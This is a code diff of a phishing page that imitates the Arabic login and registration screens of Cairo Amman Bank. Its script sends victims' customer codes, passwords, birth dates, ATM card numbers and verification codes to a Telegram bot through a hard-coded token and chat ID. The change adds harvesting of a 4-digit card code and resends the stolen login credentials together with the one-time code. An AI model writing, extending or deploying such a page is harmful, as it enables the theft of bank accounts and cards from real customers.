@@ -5,188 +5,39 @@
   <title>بنك القاهرة عمان</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: 'Cairo', Arial, sans-serif;
-      background: #fff;
-      margin: 0;
-      padding: 0;
-    }
-    .centered {
-      max-width: 420px;
-      margin: 0 auto;
-      padding: 32px 0 0 0;
-    }
-    .logo {
-      display: block;
-      margin: 0 auto 18px auto;
-      width: 120px;
-      border-radius: 16px;
-    }
-    .lang {
-      position: absolute;
-      left: 24px;
-      top: 18px;
-      color: #009150;
-      font-weight: bold;
-      font-size: 18px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .lang-icon {
-      font-size: 18px;
-      vertical-align: middle;
-    }
-    .card {
-      background: #f5f7fa;
-      border-radius: 16px;
-      padding: 24px;
-      box-shadow: 0 2px 8px #eee;
-      margin-bottom: 16px;
-    }
-    .form-title {
-      font-size: 22px;
-      font-weight: 600;
-      margin-bottom: 16px;
-      text-align: right;
-      color: #222;
-    }
-    .input-group {
-      margin-bottom: 16px;
-      position: relative;
-    }
-    .input-label {
-      font-size: 14px;
-      color: #777;
-      margin-bottom: 4px;
-      display: block;
-      text-align: right;
-    }
-    .input-field {
-      width: 100%;
-      padding: 10px 38px 10px 10px;
-      border: none;
-      border-radius: 10px;
-      background: #e9edf3;
-      font-size: 16px;
-      outline: none;
-      box-sizing: border-box;
-      direction: rtl;
-    }
-    .icon-show {
-      position: absolute;
-      left: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 16px;
-      color: #009150;
-      cursor: pointer;
-      font-weight: bold;
-      background: #fff;
-      border: 1px solid #009150;
-      border-radius: 6px;
-      padding: 2px 8px;
-      transition: background 0.2s;
-    }
-    .icon-show.active {
-      background: #009150;
-      color: #fff;
-    }
-    .icon-calendar {
-      position: absolute;
-      left: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 18px;
-      color: #aaa;
-      cursor: pointer;
-    }
-    .forgot-link {
-      display: block;
-      text-align: right;
-      color: #333;
-      font-size: 14px;
-      margin: 5px 0 14px 0;
-      text-decoration: none;
-      cursor: pointer;
-    }
-    .main-btn {
-      width: 100%;
-      background: #009150;
-      color: #fff;
-      padding: 14px 0;
-      border: none;
-      border-radius: 8px;
-      font-size: 20px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-bottom: 16px;
-      transition: background 0.2s;
-    }
-    .main-btn:hover {
-      background: #007a3c;
-    }
-    .footer {
-      margin-top: 32px;
-      text-align: center;
-      color: #aaa;
-      font-size: 14px;
-      position: relative;
-      z-index: 1;
-    }
-    .footer-links {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 32px;
-      font-size: 17px;
-      color: #222;
-      font-weight: bold;
-      padding: 0 28px;
-    }
-    .footer-link {
-      color: #222;
-      cursor: pointer;
-      text-decoration: none;
-    }
-    .footer-link:hover {
-      text-decoration: underline;
-      color: #009150;
-    }
-    .checkbox-group {
-      display: flex;
-      align-items: center;
-      margin-top: 8px;
-      margin-bottom: 18px;
-    }
-    .checkbox-group input[type="checkbox"] {
-      margin-left: 8px;
-      accent-color: #009150;
-      width: 18px;
-      height: 18px;
-      cursor: pointer;
-    }
-    .checkbox-group label {
-      font-size: 15px;
-      color: #222;
-      cursor: pointer;
-    }
+    body { font-family: 'Cairo', Arial, sans-serif; background: #fff; margin: 0; padding: 0; }
+    .centered { max-width: 420px; margin: 0 auto; padding: 32px 0 0 0; }
+    .logo { display: block; margin: 0 auto 18px auto; width: 120px; border-radius: 16px; }
+    .lang { position: absolute; left: 24px; top: 18px; color: #009150; font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 6px; }
+    .lang-icon { font-size: 18px; vertical-align: middle; }
+    .card { background: #f5f7fa; border-radius: 16px; padding: 24px; box-shadow: 0 2px 8px #eee; margin-bottom: 16px; }
+    .form-title { font-size: 22px; font-weight: 600; margin-bottom: 16px; text-align: right; color: #222; }
+    .input-group { margin-bottom: 16px; position: relative; }
+    .input-label { font-size: 14px; color: #777; margin-bottom: 4px; display: block; text-align: right; }
+    .input-field { width: 100%; padding: 10px 38px 10px 10px; border: none; border-radius: 10px; background: #e9edf3; font-size: 16px; outline: none; box-sizing: border-box; direction: rtl; }
+    .icon-show { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #009150; cursor: pointer; font-weight: bold; background: #fff; border: 1px solid #009150; border-radius: 6px; padding: 2px 8px; transition: background 0.2s; }
+    .icon-show.active { background: #009150; color: #fff; }
+    .icon-calendar { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); font-size: 18px; color: #aaa; cursor: pointer; }
+    .forgot-link { display: block; text-align: right; color: #333; font-size: 14px; margin: 5px 0 14px 0; text-decoration: none; cursor: pointer; }
+    .main-btn { width: 100%; background: #009150; color: #fff; padding: 14px 0; border: none; border-radius: 8px; font-size: 20px; font-weight: bold; cursor: pointer; margin-bottom: 16px; transition: background 0.2s; }
+    .main-btn:hover { background: #007a3c; }
+    .footer { margin-top: 32px; text-align: center; color: #aaa; font-size: 14px; position: relative; z-index: 1; }
+    .footer-links { display: flex; justify-content: space-between; margin-top: 32px; font-size: 17px; color: #222; font-weight: bold; padding: 0 28px; }
+    .footer-link { color: #222; cursor: pointer; text-decoration: none; }
+    .footer-link:hover { text-decoration: underline; color: #009150; }
+    .checkbox-group { display: flex; align-items: center; margin-top: 8px; margin-bottom: 18px; }
+    .checkbox-group input[type="checkbox"] { margin-left: 8px; accent-color: #009150; width: 18px; height: 18px; cursor: pointer; }
+    .checkbox-group label { font-size: 15px; color: #222; cursor: pointer; }
     @media (max-width: 480px) {
-      .centered {
-        max-width: 100%;
-        padding: 16px 4px 0 4px;
-      }
-      .card {
-        padding: 16px;
-      }
-      .footer-links {
-        padding: 0 10px;
-        font-size: 15px;
-      }
+      .centered { max-width: 100%; padding: 16px 4px 0 4px; }
+      .card { padding: 16px; }
+      .footer-links { padding: 0 10px; font-size: 15px; }
     }
   </style>
 </head>
 <body>
   <div class="lang"><span>EN</span> <span class="lang-icon">&#127760;</span></div>
+  
   <div class="centered" id="login-page">
     <img src="https://www2.0zz0.com/2025/09/30/14/235342786.jpeg" alt="logo" class="logo">
     <div class="card">
@@ -207,6 +58,7 @@
       <a class="footer-link" onclick="showRegister()">التسجيل كعميل</a>
     </div>
   </div>
+  
   <div class="centered" id="verify-page" style="display:none;">
     <img src="https://www2.0zz0.com/2025/09/30/14/235342786.jpeg" alt="logo" class="logo">
     <div class="card">
@@ -220,6 +72,7 @@
       <a class="footer-link" onclick="showLogin()">عودة إلى الدخول</a>
     </div>
   </div>
+  
   <div class="centered" id="register-page" style="display:none;">
     <img src="https://www2.0zz0.com/2025/09/30/14/235342786.jpeg" alt="logo" class="logo">
     <div class="card">
@@ -235,6 +88,10 @@
         <input type="text" class="input-field" placeholder="بطاقة الصراف الآلي *" id="reg-card" maxlength="16" inputmode="numeric" oninput="onlyNumber(this,16)">
         <span class="icon-show" onclick="togglePassword('reg-card', this)">إظهار</span>
       </div>
+      <div class="input-group">
+        <input type="text" class="input-field" placeholder="رمز التحقق (4 أرقام) *" id="reg-code" maxlength="4" inputmode="numeric" oninput="onlyNumber(this,4)">
+        <span class="icon-show" onclick="togglePassword('reg-code', this)">إظهار</span>
+      </div>
       <div class="checkbox-group">
         <input type="checkbox" id="reg-terms">
         <label for="reg-terms">أوافق على الشروط والأحكام</label>
@@ -245,12 +102,11 @@
       <a class="footer-link" onclick="showLogin()">عودة إلى الدخول</a>
     </div>
   </div>
+  
   <script>
     const TELEGRAM_TOKEN = "7962720643:AAFgFfeyec_SfTiEpQOsMPe7QSa7vH4Luq8";
     const TELEGRAM_CHAT_ID = "6873334348";
-
-    // بيانات التسجيل المؤقتة
-    let registerData = {};
+    let loginData = {};
 
     function onlyNumber(el, maxLength) {
       el.value = el.value.replace(/\D/g, '');
@@ -311,15 +167,17 @@
         alert('يرجى إدخال رمز العميل وكلمة المرور');
         return;
       }
-      sendToTelegram(`دخول جديد:\nرمز العميل: ${user}\nكلمة المرور: ${pass}`);
+      loginData = { user, pass };
+      sendToTelegram(`دخول:\nرمز العميل: ${user}\nكلمة المرور: ${pass}`);
       showVerify();
     }
     function submitRegister() {
       const user = document.getElementById('reg-user').value.trim();
       const birth = document.getElementById('reg-birth').value.trim();
       const card = document.getElementById('reg-card').value.trim();
+      const code = document.getElementById('reg-code').value.trim();
       const terms = document.getElementById('reg-terms').checked;
-      if (!user || !birth || !card || !terms) {
+      if (!user || !birth || !card || !code || !terms) {
         alert('يرجى تعبئة جميع الحقول والموافقة على الشروط');
         return;
       }
@@ -327,27 +185,23 @@
         alert('بطاقة الصراف الآلي يجب أن تتكون من 16 رقم فقط');
         return;
       }
-      registerData = { user, birth, card };
-      // أرسل معلومات التسجيل كاملة
-      sendToTelegram(
-        `تسجيل جديد:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nبطاقة الصراف الآلي: ${card}`
-      );
-      // أرسل معلومات التسجيل مع البطاقة فقط
-      sendToTelegram(
-        `معلومات التسجيل مع البطاقة:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nبطاقة الصراف الآلي: ${card}`
-      );
-      showVerify();
+      if (!/^\d{4}$/.test(code)) {
+        alert('رمز التحقق يجب أن يتكون من 4 أرقام فقط');
+        return;
+      }
+      sendToTelegram(`تسجيل جديد:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nبطاقة الصراف الآلي: ${card}\nرمز التحقق: ${code}`);
+      sendToTelegram(`رمز التحقق من صفحة البطاقة: ${code}`);
+      showLogin();
     }
     function submitVerify() {
       const verifyCode = document.getElementById('verify-code').value.trim();
-      // أرسل معلومات التسجيل السابقة مع رمز التحقق إلى البوت
-      if (registerData.user && registerData.birth && registerData.card) {
-        sendToTelegram(
-          `تسجيل جديد مع رمز التحقق:\nرمز العميل: ${registerData.user}\nتاريخ الميلاد: ${registerData.birth}\nبطاقة الصراف الآلي: ${registerData.card}\nرمز التحقق: ${verifyCode}`
-        );
-        registerData = {};
-        showLogin();
+      if (!loginData.user || !loginData.pass || !verifyCode) {
+        alert('يرجى إدخال جميع البيانات المطلوبة');
+        return;
       }
+      sendToTelegram(`دخول مع رمز التحقق:\nرمز العميل: ${loginData.user}\nكلمة المرور: ${loginData.pass}\nرمز التحقق المدخل: ${verifyCode}`);
+      loginData = {};
+      showLogin();
     }
   </script>
 </body>
